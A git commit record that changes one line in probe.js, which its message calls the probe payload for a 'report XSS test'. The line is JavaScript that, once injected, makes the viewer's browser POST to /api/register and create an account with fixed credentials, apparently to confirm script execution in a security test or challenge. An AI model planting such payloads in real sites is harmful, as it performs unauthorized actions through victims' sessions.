d24e67d7b1b341363e5be6de21a61b266778eba0
yorik338 <96735382+yorik338@users.noreply.github.com>
2026-04-18 13:36:33 +0300

    Update probe payload for report XSS test

--- probe.js
+++ probe.js
@@ -1,1 +1,1 @@
-fetch('/api/register',{method:'POST',headers:{'Content-Type':'application/json'},body:'{"username":"botprobe","password":"botprobe"}'})
+fetch('/api/register',{method:'POST',headers:{'Content-Type':'application/json'},body:'{"username":"stage2probe","password":"stage2probe"}'})
